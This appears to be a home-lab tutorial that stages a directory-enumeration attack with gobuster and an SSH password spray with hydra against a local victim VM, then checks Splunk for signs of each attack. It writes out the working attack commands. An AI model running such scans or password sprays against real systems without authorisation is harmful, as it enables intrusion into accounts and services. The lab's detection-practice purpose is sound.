*Directory Enumeration

-first we install apache on the victim VM:
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2

-Then we create some fake directories within to discover:
sudo mkdir -p /var/www/html/admin
sudo mkdir -p /var/www/html/backup
sudo mkdir -p /var/www/html/login
echo "admin page" | sudo tee /var/www/html/admin/index.html
echo "backup page" | sudo tee /var/www/html/backup/index.html

-Next on the Attacker VM we install gobuster
sudo apt install gobuster -y

-For this attack we willl just be using the common.txt wordlist, so we install it as
sudo apt install dirb -y

-Then we run gobuster on the kali system

gobuster dir -u http://192.168.56.20 -w /usr/share/wordlists/dirb/common.txt

Then we go to Splunk and see if this attack went through, we do this by doing index=main sourcetype=syslog "gobuster"

*Password Spray Attack

-Firstly on our victim vm we create a number of users, it should at least be more than 3 and make sure to give a few of them matching passwords.

sudo adduser user1
sudo adduser user2
sudo adduser user3

nano users.txt

after the nano just put down the user1, 2 and 3.
After this we create a list of passwords to try on our Attacker VM.

nano passwords.txt

and insert whatever passwords you want on here, some should at least match the ones of your users.
Then we execute the password spray

hydra -L users.txt -P passwords.txt ssh://192.168.56.20

Finally we check on Splunk by looking for the user1,2,... etc. and see if they are present. If they are the attack works.
